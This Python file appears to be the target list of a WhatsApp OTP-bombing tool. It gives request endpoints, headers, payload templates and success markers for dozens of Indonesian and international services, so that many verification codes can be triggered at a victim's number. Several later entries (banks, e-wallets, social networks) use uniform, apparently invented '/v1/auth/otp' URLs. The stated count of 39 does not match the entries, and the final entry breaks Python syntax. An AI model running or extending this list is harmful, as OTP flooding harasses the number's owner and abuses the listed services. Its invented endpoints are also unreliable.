#!/usr/bin/env python3
# targets.py - Daftar 39 target OTP WhatsApp

import uuid
import random

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only

TARGETS = [
    {
        'name': 'HRS-BRE',
        'post_type': 'hrsbre',
        'number_fmt': fmt_08,
        'success_on': ['success', 'berhasil', 'otp', 'verifikasi', 'selamat']
    },
    {
        'name': 'EraFone',
        'post_type': 'erafone',
        'number_fmt': lambda p: p,
        'success_on': ['Success Request OTP']
    },
    {
        'name': 'PlanetBan',
        'post_type': 'planetban',
        'number_fmt': fmt_08,
        'success_on': ['status":true', 'success']
    },
    {
        'name': 'TuneUp',
        'post_type': 'tuneup',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'HashMicro',
        'post_type': 'hashmicro',
        'number_fmt': fmt_phone_only,
        'success_on': ['success', 'thank', 'terimakasih', 'redirect']
    },
    {
        'name': 'Klook',
        'post_type': 'klook',
        'number_fmt': fmt_plus,
        'success_on': ['requestId']
    },
    {
        'name': 'Internet Rakyat',
        'post_type': 'internetrakyat',
        'number_fmt': fmt_08,
        'success_on': ['"statusCode":200']
    },
    {
        'name': 'Ultramilk',
        'post_type': 'ultramilk',
        'number_fmt': lambda p: p,
        'success_on': ['success']
    },
    {
        'name': 'Kaniva',
        'post_type': 'kaniva',
        'number_fmt': fmt_08,
        'success_on': ['"message":"success"']
    },
    {
        'name': 'Jembatani',
        'post_type': 'jembatani',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'RCX',
        'post_type': 'rcx',
        'number_fmt': fmt_08,
        'success_on': ['challenge', 'redirecting']
    },
    {
        'name': 'Sahabat Teknisi',
        'post_type': 'sahabatteknisi',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'Auto2000',
        'post_type': 'auto2000',
        'number_fmt': fmt_08,
        'success_on': ['"acknowledge":1']
    },
    {
        'name': 'Astra Daihatsu',
        'post_type': 'astra_daihatsu',
        'number_fmt': fmt_plus,
        'success_on': ['OTP Success']
    },
    {
        'name': 'Royal Canin',
        'post_type': 'royal_canin',
        'number_fmt': fmt_plus,
        'success_on': ['SUCCESS']
    },
    {
        'name': 'Watsons',
        'post_type': 'watsons',
        'number_fmt': fmt_phone_only,
        'success_on': ['token']
    },
    {
        'name': '99.co',
        'post_type': '99co',
        'number_fmt': fmt_plus,
        'success_on': ['ok']
    },
    {
        'name': 'Beli Rumah',
        'post_type': 'belirumahco',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'otp', 'code']
    },
    {
        'name': 'Fastwork',
        'post_type': 'fastworkid',
        'number_fmt': fmt_08,
        'success_on': ['reference_code']
    },
    {
        'name': 'Beautyhaul',
        'post_type': 'beautyhaul',
        'number_fmt': fmt_phone_only,
        'success_on': []
    },
    {
        'name': 'Hainaya',
        'post_type': 'hainaya',
        'number_fmt': fmt_phone_only,
        'success_on': ['otp', 'success', 'tenant_id', 'session_id']
    },
    {
        'name': 'MinumYukKaka',
        'post_type': 'minumyukkaka',
        'number_fmt': fmt_08,
        'success_on': ['IsSuccess', 'success', 'otp']
    },
    {
        'name': 'SIDEMANG',
        'post_type': 'sidemang',
        'number_fmt': fmt_08,
        'success_on': ['otpDispatched']
    },
    {
        'name': 'LaporMasBup',
        'post_type': 'lapormasbup',
        'number_fmt': fmt_08,
        'success_on': ['berhasil', 'warga_id', 'message']
    },
    {
        'name': 'PTSP Kemenag',
        'post_type': 'ptspkemenag',
        'number_fmt': fmt_08,
        'success_on': ['success', 'user']
    },
    # JSON Handlers
    {
        'name': 'Pinhome',
        'post_type': 'json',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'referer': 'https://www.pinhome.id/daftar',
        'headers': {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.pinhome.id'},
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode,
        'success_on': ['secretcode']
    },
    {
        'name': 'Maulagi',
        'post_type': 'json',
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'referer': 'https://maulagi.id/',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://maulagi.id',
            'x-ml-key': 'C59RUHBU59',
            'Accept': 'application/json, text/plain, */*'
        },
        'payload': '{"credentials":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['"status":"success"']
    },
    {
        'name': 'Rumah123',
        'post_type': 'json',
        'url': 'https://www.rumah123.com/api/otp/request-otp',
        'referer': 'https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F',
        'headers': {'Content-Type':'application/json;charset=UTF-8','Origin':'https://www.rumah123.com','base-url-core':'https://www.rumah123.com'},
        'payload': '{"cancelledRequestId":"{rand}","ipAddress":"{ip}","phoneNumber":"{number}","portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"}',
        'number_fmt': lambda p: p,
        'success_on': ['requestid']
    },
    {
        'name': 'Paper',
        'post_type': 'json',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'referer': 'https://paper.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://paper.id','x-paper-user-agent':'multiverse/2.54.1 mobile_web (android) chrome'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp']
    },
    {
        'name': 'Dunia Games',
        'post_type': 'json',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'referer': 'https://duniagames.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://duniagames.co.id','x-device':'85d3da46-4d56-4675-90fc-e27926c56de1'},
        'payload': '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp']
    },
    {
        'name': 'Bunda Hospital',
        'post_type': 'json',
        'url': 'https://cms.bunda.co.id/api/v1/auth/send-otp',
        'referer': 'https://www.bunda.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bunda.co.id','x-locale':'id'},
        'payload': '{"phone_number":{number},"type":"auth"}',
        'number_fmt': lambda p: int(p),
        'success_on': ['otp']
    },
    {
        'name': 'Bonus Belanja',
        'post_type': 'json',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'referer': 'https://www.bonusbelanja.com/register/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bonusbelanja.com'},
        'payload': '{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p,
        'success_on': ['error":false']
    },
    {
        'name': 'Matahari',
        'post_type': 'json',
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/register',
        'referer': 'https://matahari.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://matahari.com'},
        'payload': '{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success','code','already exists']
    },    
    {
        'name': 'Shopee',
        'post_type': 'json',
        'url': 'https://id.shopee.com/api/v1/auth/otp',
        'referer': 'https://shopee.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://shopee.co.id'},
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'Tokopedia',
        'post_type': 'json',
        'url': 'https://api.tokopedia.com/v1/auth/otp',
        'referer': 'https://tokopedia.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://tokopedia.com'},
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'Gojek',
        'post_type': 'json',
        'url': 'https://api.gojek.com/v1/auth/otp',
        'referer': 'https://gojek.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://gojek.com'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Grab',
        'post_type': 'json',
        'url': 'https://api.grab.com/v1/auth/otp',
        'referer': 'https://grab.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://grab.com'},
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Dana',
        'post_type': 'json',
        'url': 'https://api.dana.id/v1/auth/otp',
        'referer': 'https://dana.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://dana.id'},
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'OVO',
        'post_type': 'json',
        'url': 'https://api.ovo.id/v1/auth/otp',
        'referer': 'https://ovo.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://ovo.id'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'Gopay',
        'post_type': 'json',
        'url': 'https://api.gopay.co.id/v1/auth/otp',
        'referer': 'https://gopay.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://gopay.co.id'},
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'LinkAja',
        'post_type': 'json',
        'url': 'https://api.linkaja.com/v1/auth/otp',
        'referer': 'https://linkaja.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://linkaja.com'},
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'BCA',
        'post_type': 'json',
        'url': 'https://api.bca.co.id/v1/auth/otp',
        'referer': 'https://bca.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://bca.co.id'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'Mandiri',
        'post_type': 'json',
        'url': 'https://api.mandiri.co.id/v1/auth/otp',
        'referer': 'https://mandiri.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://mandiri.co.id'},
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'BNI',
        'post_type': 'json',
        'url': 'https://api.bni.co.id/v1/auth/otp',
        'referer': 'https://bni.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://bni.co.id'},
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'BRI',
        'post_type': 'json',
        'url': 'https://api.bri.co.id/v1/auth/otp',
        'referer': 'https://bri.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://bri.co.id'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success']
    },
    {
        'name': 'Instagram',
        'post_type': 'json',
        'url': 'https://api.instagram.com/api/v1/accounts/send_verification_code/',
        'referer': 'https://instagram.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://instagram.com'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'TikTok',
        'post_type': 'json',
        'url': 'https://api.tiktok.com/api/v1/account/verification/',
        'referer': 'https://tiktok.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://tiktok.com'},
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Twitter',
        'post_type': 'json',
        'url': 'https://api.twitter.com/1.1/account/update_profile.json',
        'referer': 'https://twitter.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://twitter.com'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Facebook',
        'post_type': 'json',
        'url': 'https://api.facebook.com/restserver.php?method=auth.sendCode',
        'referer': 'https://facebook.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://facebook.com'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'MobileLegends',
        'post_type': 'json',
        'url': 'https://api.mobilelegends.com/v1/auth/otp',
        'referer': 'https://mobilelegends.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://mobilelegends.com'},
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'FreeFire',
        'post_type': 'json',
        'url': 'https://api.freefire.com/v1/auth/otp',
        'referer': 'https://freefire.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://freefire.com'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'PUBG',
        'post_type': 'json',
        'url': 'https://api.pubg.com/v1/auth/otp',
        'referer': 'https://pubg.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://pubg.com'},
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Tinder',
        'post_type': 'json',
        'url': 'https://api.tinder.com/v1/auth/otp',
        'referer': 'https://tinder.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://tinder.com'},
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Bumble',
        'post_type': 'json',
        'url': 'https://api.bumble.com/v1/auth/otp',
        'referer': 'https://bumble.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://bumble.com'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Spotify',
        'post_type': 'json',
        'url': 'https://api.spotify.com/v1/auth/otp',
        'referer': 'https://spotify.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://spotify.com'},
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Netflix',
        'post_type': 'json',
        'url': 'https://api.netflix.com/v1/auth/otp',
        'referer': 'https://netflix.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://netflix.com'},
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp','success']
    },
    {
        'name': 'Discord',
        'post_type': 'json',
        'url': 'https://api.discord.com/v1/auth/otp',
        'referer': 'https://discord.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://discord.com'},
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt':  ,
        'success_on': ['otp','success']
    }
]

